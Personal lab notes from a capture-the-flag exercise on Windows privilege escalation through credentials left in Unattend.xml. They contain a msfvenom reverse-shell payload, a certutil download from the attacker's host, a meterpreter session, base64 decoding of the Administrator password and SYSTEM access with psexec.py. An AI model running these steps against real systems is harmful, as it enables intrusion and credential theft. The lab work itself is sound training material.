- Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems
- This is typically done through the use of the Unattended Windows setup utility, which is used to automate the mass installation/development of Windows on systems.
- This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password
- If the Unattended Windows setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with windows target legitimately.

### Unattended Windows setup

- The unattended windows setup utility will typically utilize one of the following configuration files that contain user account and system configuration information
	- C:\Windows\Panther\Unattended.xml
	- C:\Windows\Panther\Autounattend.xml
- As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.

---

A Kali GUI machine and a Windows machine provided to you. 

Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations.  The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)post-exploitation framework has provided to you on the windows machine.

Objective: Gain access to meterpreter session with high privilege.

Instructions:

- You can check the IP address of the machine by running "ipconfig" command on the command prompt i.e cmd.exe
- Do not attack the gateway located at IP address 10.0.0.1

We got both Kali and Windows machines in this lab so I checked the user and the architecture of the os also the initial privileges of the user student.

[[ping]]

```
root@attackdefense:~# cat /root/Desktop/target 
Target Machine IP Address: : 10.5.17.71
root@attackdefense:~# ping -c 5 10.5.17.71
PING 10.5.17.71 (10.5.17.71) 56(84) bytes of data.
64 bytes from 10.5.17.71: icmp_seq=1 ttl=125 time=2.37 ms
64 bytes from 10.5.17.71: icmp_seq=2 ttl=125 time=2.04 ms
64 bytes from 10.5.17.71: icmp_seq=3 ttl=125 time=1.95 ms
64 bytes from 10.5.17.71: icmp_seq=4 ttl=125 time=2.04 ms
64 bytes from 10.5.17.71: icmp_seq=5 ttl=125 time=2.06 ms

--- 10.5.17.71 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 1.947/2.091/2.373/0.146 ms
```

In windows

```
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\student>net user

User accounts for \\PRIV-ESC

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
student                  WDAGUtilityAccount
The command completed successfully.


C:\Users\student>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\student>
```

[[msfvenom]]

```
root@attackdefense:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f exe -o payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe
root@attackdefense:~# 
```

Python server

```
python -m SimpleHTTPServer 80
```

Downloading the file in windows using certutil

```
C:\Users\student\Desktop>certutil -urlcache -f http://10.10.12.2/payload.exe payload.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

[[metasploit]]

```
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm���~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:T��iKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
                                              `MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`                  
                                                J~HAKCERS~./.`                    
                                                .esc:wq!:`                        
                                                 +++ATH`                            
                                                  `


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2052 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the last opened session

msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set lhost 10.10.12.2
lhost => 10.10.12.2
msf5 exploit(multi/handler) > set lport 1234
lport => 1234
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.12.2:1234 
[*] Sending stage (201283 bytes) to 10.5.17.71
[*] Meterpreter session 1 opened (10.10.12.2:1234 -> 10.5.17.71:49754) at 2023-07-18 19:10:15 +0530
```

Once the meterpreter is active we need to click on the windows payload that we uploaded so that the connection is established. Usually we do this by exploiting a vulnerability. As we got access to the target we are doing this.

```
meterpreter > sysinfo
Computer        : PRIV-ESC
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > search
[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
meterpreter > search -f Unattend.xml
^C[-] Error running command search: Interrupt 
meterpreter > cd C:\\
meterpreter > cd Windows 
meterpreter > cd Panther 
meterpreter > dir
Listing: C:\Windows\Panther
===========================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  68        fil   2020-10-27 10:43:44 +0530  Contents0.dir
100666/rw-rw-rw-  12038     fil   2018-11-15 05:35:39 +0530  DDACLSys.log
100666/rw-rw-rw-  24494     fil   2020-10-27 10:43:44 +0530  MainQueueOnline0.que
40777/rwxrwxrwx   0         dir   2018-11-14 12:25:59 +0530  Unattend
40777/rwxrwxrwx   0         dir   2018-11-15 05:35:25 +0530  UnattendGC
40777/rwxrwxrwx   4096      dir   2018-11-15 05:38:25 +0530  actionqueue
100666/rw-rw-rw-  2229      fil   2018-11-15 05:35:28 +0530  diagerr.xml
100666/rw-rw-rw-  4296      fil   2018-11-15 05:35:28 +0530  diagwrn.xml
100666/rw-rw-rw-  10006528  fil   2018-11-15 05:33:39 +0530  setup.etl
40777/rwxrwxrwx   0         dir   2018-11-15 05:35:28 +0530  setup.exe
100666/rw-rw-rw-  83991     fil   2018-11-15 05:35:28 +0530  setupact.log
100666/rw-rw-rw-  142       fil   2018-11-15 05:35:28 +0530  setuperr.log
100666/rw-rw-rw-  16640     fil   2020-10-27 10:43:04 +0530  setupinfo
100666/rw-rw-rw-  3519      fil   2020-10-29 10:29:18 +0530  unattend.xml

meterpreter > download unattend.xml
[*] Downloading: unattend.xml -> unattend.xml
[*] Downloaded 3.44 KiB of 3.44 KiB (100.0%): unattend.xml -> unattend.xml
[*] download   : unattend.xml -> unattend.xml
meterpreter >
```

Basic Concatenate command to see the content of unattend.xml in kali as we downloaded it using the meterpreter session.

```
root@attackdefense:~# cat unattend.xml 
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="windowsPE">
        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <UserData>
                <ProductKey>
                    <WillShowUI>Always</WillShowUI>
                </ProductKey>
            </UserData>
            <UpgradeData>
                <Upgrade>true</Upgrade>
                <WillShowUI>Always</WillShowUI>
            </UpgradeData>
        </component>
        <component name="Microsoft-Windows-PnpCustomizationsWinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <DriverPaths>
                <PathAndCredentials wcm:keyValue="1" wcm:action="add">
                    <Path>$WinPEDriver$</Path>
                </PathAndCredentials>
            </DriverPaths>
        </component>
    </settings>
    <settings pass="specialize">
        <component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <RunSynchronous>
                <RunSynchronousCommand wcm:action="add">
                    <Order>1</Order>
                    <Path>cmd /c "FOR %i IN (X F E D C) DO (FOR /F "tokens=6" %t in ('vol %i:') do (IF /I %t NEQ "" (IF EXIST %i:\BootCamp\BootCamp.xml Reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v AppsRoot /t REG_SZ /d %i /f )))"</Path>
                </RunSynchronousCommand>
            </RunSynchronous>
        </component>
    </settings>
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <FirstLogonCommands>
              <SynchronousCommand wcm:action="add">
                <Description>AMD CCC Setup</Description>
                <CommandLine>%AppsRoot%:\BootCamp\Drivers\ATI\ATIGraphics\Bin64\ATISetup.exe -Install</CommandLine>
                <Order>1</Order>
                <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
              <SynchronousCommand wcm:action="add">
                  <Description>BootCamp setup</Description>
                  <CommandLine>%AppsRoot%:\BootCamp\setup.exe</CommandLine>
                  <Order>2</Order>
                  <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
            </FirstLogonCommands>
            <AutoLogon>
                <Password>
                    <Value>QWRtaW5AMTIz</Value>
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>administrator</Username>
            </AutoLogon>
        </component>
    </settings>
</unattend>

```

From the above we can see that the firstlogon commands password and if it was a plain text format. So we copy the base64 password and save it to a file on kali desktop.

```
root@attackdefense:~# echo "QWRtaW5AMTIz" > password.txt
```

crack the base64 password using the following command

```
root@attackdefense:~# base64 -d password.txt 
Admin@123
root@attackdefense:~# 
```

So the first logon password is Admin@123

[[PsExec]]

```
root@attackdefense:~# psexec.py "Administrator":"Admin@123"@10.5.17.71
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.5.17.71.....
[*] Found writable share ADMIN$
[*] Uploading file RFoVnPKe.exe
[*] Opening SVCManager on 10.5.17.71.....
[*] Creating service uOcK on 10.5.17.71.....
[*] Starting service uOcK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd C:\\

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
05/13/2020  05:58 PM    <DIR>          PerfLogs
10/27/2020  09:59 AM    <DIR>          Program Files
10/27/2020  10:02 AM    <DIR>          Program Files (x86)
10/27/2020  09:57 AM    <DIR>          Users
07/18/2023  01:59 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  15,774,498,816 bytes free

C:\>cd Users

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users

10/27/2020  09:57 AM    <DIR>          .
10/27/2020  09:57 AM    <DIR>          ..
10/27/2020  09:44 AM    <DIR>          Administrator
12/12/2018  07:45 AM    <DIR>          Public
10/27/2020  09:57 AM    <DIR>          student
               0 File(s)              0 bytes
               5 Dir(s)  15,774,498,816 bytes free

C:\Users>cd Administrator

C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator

10/27/2020  09:44 AM    <DIR>          .
10/27/2020  09:44 AM    <DIR>          ..
10/27/2020  09:44 AM    <DIR>          3D Objects
10/27/2020  09:44 AM    <DIR>          Contacts
11/07/2020  07:03 AM    <DIR>          Desktop
10/27/2020  09:57 AM    <DIR>          Documents
10/27/2020  10:32 AM    <DIR>          Downloads
10/27/2020  09:44 AM    <DIR>          Favorites
10/27/2020  09:44 AM    <DIR>          Links
10/27/2020  09:44 AM    <DIR>          Music
10/27/2020  09:44 AM    <DIR>          Pictures
10/27/2020  09:44 AM    <DIR>          Saved Games
10/27/2020  09:44 AM    <DIR>          Searches
10/27/2020  09:44 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  15,774,498,816 bytes free

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator\Desktop

11/07/2020  07:03 AM    <DIR>          .
11/07/2020  07:03 AM    <DIR>          ..
11/07/2020  07:03 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,774,498,816 bytes free

C:\Users\Administrator\Desktop>type flag.txt
097ab83639dce0ab3429cb0349493f60
```

